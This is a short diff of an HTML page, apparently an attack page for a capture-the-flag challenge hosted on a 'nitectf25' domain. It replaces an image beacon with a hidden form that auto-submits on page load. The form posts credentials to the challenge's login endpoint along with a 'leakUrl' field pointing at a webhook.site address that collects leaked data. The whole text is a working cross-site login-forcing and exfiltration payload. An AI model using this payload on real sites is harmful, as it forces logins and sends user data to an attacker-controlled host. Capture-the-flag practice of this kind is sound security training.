@@ -1,6 +1,15 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <img src="https://webhook.site/dab3b242-b472-4d82-97d6-9bf6897a60e0" />
+    <form id="f" action="https://cars.chalz.nitectf25.live/login" method="POST">
+      <input type="hidden" name="username" value="user">
+      <input type="hidden" name="password" value="demo123">
+      <input type="hidden" name="leakUrl"
+        value="https://webhook.site/dab3b242-b472-4d82-97d6-9bf6897a60e0">
+    </form>
+
+    <script>
+      document.getElementById('f').submit();
+    </script>
   </body>
 </html>
